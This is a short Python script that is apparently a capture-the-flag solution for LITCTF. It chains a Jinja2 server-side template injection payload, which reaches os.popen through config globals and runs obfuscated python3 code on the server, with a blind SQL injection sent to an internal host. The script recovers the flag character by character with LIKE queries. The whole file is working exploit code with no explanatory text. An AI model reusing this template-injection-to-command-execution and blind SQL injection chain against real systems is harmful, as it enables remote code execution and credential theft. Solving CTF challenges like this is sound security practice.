import requests
import re
import sys, json
import string
def blindSqli():
    extracted_data = ""
    for index in range(1,33):
        for i in "0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ!{}#$&()*+,-./:;<=>?@[\\]^`{|}~_":
            query = "flag' and password like 'LITCTF{"+extracted_data+i+"%' ESCAPE '@' -- -"	#+extracted_data+i
            query = json.dumps({"username": query, "password": "b"}).encode().hex()
            query = '''{{((config|attr('__class__')|attr('__init__')|attr('__globals__'))['os']|attr('popen'))('python3 -c \\x27import requests; print(requests\\x2epost(\\x22http://172\\x2e24\\x2e0\\x2e8:8080/runquery\\x22, headers={\\x22Content-Type\\x22: \\x22application/json\\x22}, data=bytes\\x2efromhex(\\x22''' +query  + '''\\x22)\\x2edecode(\\x22utf-8\\x22))\\x2etext)\\x27')|attr('read')()}}'''
            data= {"username":'a', "password": query}
            header = {"Content-Type": "application/x-www-form-urlencoded"}
            #print(data)
            r = requests.post("http://litctf.live:31781", headers=header, data=data)
            print(i,  extracted_data)
            if "True" in r.text:
                extracted_data += i
                print(extracted_data)
                break
    return extracted_data
	

if __name__ == "__main__":
    blindSqli()

